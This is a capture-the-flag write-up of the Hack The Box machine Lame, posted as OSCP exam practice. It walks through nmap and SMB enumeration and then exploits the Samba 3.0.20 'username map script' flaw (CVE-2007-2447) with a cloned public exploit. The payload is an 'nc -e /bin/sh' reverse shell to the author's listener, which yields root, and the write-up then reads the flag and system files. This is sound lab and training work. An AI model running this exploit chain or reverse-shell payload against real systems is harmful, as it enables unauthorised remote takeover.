---
title: Write-up Lame on HTB
author: eMVee
date: 2023-04-14 19:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, PNPT, SMB, samba, CVE-2007-2447 ]
render_with_liquid: false
---

Another machine on TJnull's list for practicing for the OSCP exam. Since you need a lot of practice to master a methodology, it's time to hack an older machine. The machine is called Lame and is hosted on Hack The Box. I have no idea what to imagine as vulnerability. We should spawn the machine at HTB.

## Let's get started
As usual we should start with creating our project directory, dicover our own IP address and assign the IP address of the spawned machine to a variable.

```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HTB/

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mcd Lame  

┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ myip    

    inet 127.0.0.1
    inet 10.0.2.15
    inet 10.10.14.44

┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ ip=10.129.216.140

```

## Enumeration
Let's first check with a ping request to see if the target is responding to our ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ ping $ip -c 3
PING 10.129.216.140 (10.129.216.140) 56(84) bytes of data.
64 bytes from 10.129.216.140: icmp_seq=1 ttl=63 time=46.3 ms
64 bytes from 10.129.216.140: icmp_seq=2 ttl=63 time=50.7 ms
64 bytes from 10.129.216.140: icmp_seq=3 ttl=63 time=50.3 ms

--- 10.129.216.140 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2005ms
rtt min/avg/max/mdev = 46.267/49.088/50.712/2.002 ms
```
In the answer a value of 63 is given in the ttl field. This should be an indicator that the target is running on a Linux operating system.
Let's get started with enumerating open ports and services on the target.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ nmap -sC -T4 $ip -p- -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 16:55 CEST
Nmap scan report for 10.129.216.140
Host is up (0.048s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Host script results:
|_clock-skew: mean: 2h00m28s, deviation: 2h49m43s, median: 27s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-04-14T10:57:59-04:00

Nmap done: 1 IP address (1 host up) scanned in 168.82 seconds

```
We did discover a lot of open ports and services with nmap what we should add to our notes.
* Linux
* Port 21
	* FTP
	* FTP user account
	* vsFTPd 2.3.4
* Port 22
	* SSH
* Port 139 + 445
	* SMB
	* Samba 3.0.20-Debian
* Port 3632
	* No idea

Let's try to get some information about the version numbers with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip -Pn
[sudo] password for emvee: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 16:58 CEST
Nmap scan report for 10.129.216.140
Host is up (0.067s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.18 (ClarkConnect 4.3 Enterprise Edition) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m27s, deviation: 2h49m45s, median: 24s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-04-14T11:01:50-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   98.99 ms 10.10.14.1
2   99.13 ms 10.129.216.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.75 seconds

```
We have to update our notes again based on the results.

* Linux, probably Ubuntu
* Port 21
	* FTP
	* FTP user account
	* vsFTPd 2.3.4
* Port 22
	* SSH
	* OpenSSH 4.7p1 Debian 8ubuntu1 
* Port 139 + 445
	* SMB
	* Samba 3.0.20-Debian
* Port 3632
	* No idea
	* distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Let's find out what we can discover on the Samba server. Perhaps there are some SMB shares what we can use.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ smbmap -H $ip -v                       
[+] 10.129.216.140:445 is running Unix (name:LAME) (domain:LAME)
                                                                                                                   
┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ smbmap -H $ip   
[+] IP: 10.129.216.140:445      Name: 10.129.216.140                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))

```
There is a share `tmp` what we can access. It looks like we can read and write here. Let's try to find an exploit for the samba version with searchsploit.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ searchsploit samba 3.0.20 
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                           | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                            | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                    | linux_x86/dos/36741.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```
As we did not discover an interesting exploit with searchsploit we should use [Google](https://www.google.com/search?q=Samba+3.0.20+exploit+github+rce)
We have found two different exploits that might be interesting and working for us.

Exploit option 1
```
https://github.com/Ziemni/CVE-2007-2447-in-Python
```

Exploit option 2
```
https://github.com/0xkasra/CVE-2007-2447
```

Let's clone the first exploit to our project directory.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ git clone https://github.com/Ziemni/CVE-2007-2447-in-Python.git                             
Cloning into 'CVE-2007-2447-in-Python'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 10 (delta 2), reused 3 (delta 0), pack-reused 0
Receiving objects: 100% (10/10), done.
Resolving deltas: 100% (2/2), done.

┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ cd CVE-2007-2447-in-Python 

```
As soon as we are set we should start our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ rlwrap nc -lvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

```

## Initial access
Everything is set to capture an incoming shell, we should start now our exploit.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Lame/CVE-2007-2447-in-Python]
└─$ python3 smbExploit.py $ip 'nc -e /bin/sh 10.10.14.44 4444'
[*] Sending the payload
[*] Something went wrong
ERROR:

```

Let's check our netcat listener.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ rlwrap nc -lvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.216.140.
Ncat: Connection from 10.129.216.140:49678.

```
It looks like we have a connection with our target. We should upgrade the shell a bit and capture the flag in OSCP style.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Lame]
└─$ rlwrap nc -lvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.216.140.
Ncat: Connection from 10.129.216.140:49678.
python -c 'import pty;pty.spawn("/bin/bash")'
root@lame:/# whoami
whoami
root
root@lame:/# hostname
hostname
lame
root@lame:/# ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:96:65:b1  
          inet addr:10.129.216.140  Bcast:10.129.255.255  Mask:255.255.0.0
          inet6 addr: dead:beef::250:56ff:fe96:65b1/64 Scope:Global
          inet6 addr: fe80::250:56ff:fe96:65b1/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:265695 errors:0 dropped:0 overruns:0 frame:0
          TX packets:791 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:17843763 (17.0 MB)  TX bytes:85330 (83.3 KB)
          Interrupt:19 Base address:0x2024 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:263 errors:0 dropped:0 overruns:0 frame:0
          TX packets:263 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:100301 (97.9 KB)  TX bytes:100301 (97.9 KB)

root@lame:/# cat /root/root.txt
cat /root/root.txt
HERE IS THE ROOT FLAG
root@lame:/# 

```
Since I am curious what Linux operating system is used I dig a bit deeper into this.
```bash
root@lame:/# uname -a
uname -a
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
root@lame:/# uname -mrs
uname -mrs
Linux 2.6.24-16-server i686
root@lame:/# cat /proc/version
cat /proc/version
Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008
root@lame:/# cat /etc/issue
cat /etc/issue
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


root@lame:/# cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
root@lame:/# lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 8.04
Release:        8.04
Codename:       hardy
root@lame:/# 

```
It looks like Ubuntu 8.04 is used and that Lame is a Metasploitable 2 machine.